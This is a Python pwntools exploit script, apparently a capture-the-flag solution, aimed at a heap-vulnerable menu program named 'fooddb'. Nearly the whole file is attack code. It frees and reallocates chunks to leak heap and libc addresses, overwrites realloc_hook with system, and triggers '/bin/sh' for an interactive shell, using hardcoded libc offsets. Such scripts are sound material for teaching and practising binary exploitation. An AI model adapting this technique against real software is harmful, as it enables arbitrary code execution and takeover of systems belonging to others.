#!/usr/bin/python
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'info')

from struct import pack, unpack
def e(*args):
    return pack('<' + 'Q'*len(args), *args)

p = process('./fooddb')
def del_type(idx):
	p.sendline('6')
	p.recvuntil('remove :')
	p.sendline(str(idx))

def show_food():
	p.recvuntil('choice :')
	p.sendline('2')
	return p.recvuntil('Menu')
def edit_food(idx, name):
	p.sendline('3')
	p.recvuntil('edit :')
	p.sendline(str(idx))
	p.recvuntil('name :')
	p.sendline(name)
	p.recvuntil('food :')
	p.sendline('1')
def add_food(name):
	p.sendline('1')
	p.recvuntil('name :')
	p.sendline(name)
	p.recvuntil('choice :')
	p.sendline('0')
def del_food(idx):
	p.recvuntil('choice :')
	p.sendline('4')
	p.recvuntil('delete :')
	p.sendline(str(idx))
def quit(idx):
	p.recvuntil('choice :')
	p.sendline('7')

for i in range(9):
	del_food(8-i)

###///////////////////////////////////del
for i in range(9):
	del_food(8-i)


#//////////////////////////////leak heap
add_food('\x00')
data = show_food()
print data.encode('hex')
heapbase = re.findall('Name : (......)\n', data)
heapbase = u64(heapbase[0].ljust(8, '\0')) & ~0xfff
print 'heapbase : ' + hex(heapbase)
del_food(0)


#//////////////////////////////////////////////////don't know what is this doing
for i in xrange(4):
	del_type(0)
add_food('A'*720 + '\x80\x00')	
add_food('L'*766)	
del_food(0)
del_food(0)

add_food('A'*720 + '\x80\x00')	
add_food('L'*766)	
del_food(0)
del_food(0)

add_food('\x00'*766)	
del_food(0)


##/////////////////////////////////////////////////////////////////////leak libc
add_food('Q'*117 + '\0')	
add_food('P'*117 + '\0')	
p.recvuntil('choice :')
p.sendline('3')
p.recvuntil('edit :')
p.sendline('1')
p.recvuntil('name :')
p.sendline('\x00' + 'a'*8)

for i in xrange(10):
	add_food('B')
for i in xrange(10, 14):
	add_food('C'*10)
add_food('DD'*5)
edit_food(0, p64(heapbase + 0x950 - 0x18))



data = show_food()
libc_base = re.findall('2. Name : (......)\n', data)
libc_base = u64(libc_base[0].ljust(8, '\0')) - 0x000000000039eb30 - 0x12
print 'libc_base: ',hex(libc_base)

realloc_hook = libc_base + 0x000000000039eb28
print 'realloc_hook: ',hex(realloc_hook)
system = libc_base + 0x000000000003f890
payload = 'a'*8 + 'b'*24*4 + '\x80'*8 + p64(realloc_hook).strip('\0')


##//////////////////////////////////////////////////////////////////overwrite
for i in range(14):
	del_food(17-i)


add_food(payload)
edit_food(4, p64(system).strip('\0'))
#add_food('/bin/sh;#\0')
add_food('/bin/sh\x00')
p.recvuntil('choice :')
p.sendline('3')
p.recvuntil('edit :')
p.sendline('5')
p.recvuntil('name :')
#p.sendline('\x00' + 'a'*8)
p.sendline('a'*88)
p.interactive()
